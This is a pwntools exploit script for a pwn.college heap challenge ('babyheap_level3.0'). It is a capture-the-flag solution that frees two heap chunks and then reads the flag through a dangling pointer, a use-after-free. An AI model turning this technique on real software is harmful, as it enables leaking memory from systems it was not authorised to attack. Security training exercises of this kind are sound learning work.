#!/usr/bin/python3
import re
from pwn import (
    ELF,
    context,
    gdb,
    log,
    process,
    remote,
)

context.log_level = "debug"
context.terminal = ["tmux", "new-window"]

FILE = "/challenge/babyheap_level3.0"
HOST, PORT = "localhost", 1337

gdbscript = """
c
"""

class Exploit:
    def __init__(self, local=True, debug=False, aslr=False, argv=None, envp=None):
        self.elf = ELF(FILE)
        context.binary = self.elf
        self.io = self.launch(local, debug, aslr, argv, envp)

    def launch(self, local=True, debug=False, aslr=False, argv=None, envp=None):
        if local:
            if debug:
                return gdb.debug(
                    [self.elf.path] + (argv or []),
                    gdbscript=gdbscript,
                    aslr=aslr,
                    env=envp,
                )
            else:
                return process([self.elf.path] + (argv or []), env=envp)
        else:
            return remote(HOST, PORT)

    def do_malloc(self, idx, size):
        self.io.sendlineafter(b": ", b"malloc")
        self.io.sendlineafter(b": ", str(idx).encode())
        self.io.sendlineafter(b": ", str(size).encode())
        return self

    def do_free(self, idx):
        self.io.sendlineafter(b": ", b"free")
        self.io.sendlineafter(b": ", str(idx).encode())
        return self

    def do_puts(self, idx):
        self.io.sendlineafter(b": ", b"puts")
        self.io.sendlineafter(b": ", str(idx).encode())
        response = self.io.recvall(timeout=0.5)
        flag = re.search(r"pwn\.college\{.*?\}", response.decode('utf-8', errors='ignore'))
        log.success(f"flag: {flag.group(0) if flag else 'not found'}")
        return self

    def do_read_flag(self):
        self.io.sendlineafter(b": ", b"read_flag")
        return self

    def run(self):
        return (
            self.do_malloc(0, 888)
            .do_malloc(1, 888)
            .do_free(0)
            .do_free(1)
            .do_read_flag()
            .do_puts(0)
        )

def main():
    exp = Exploit(local=True, debug=False)
    exp.run()


if __name__ == "__main__":
    main()
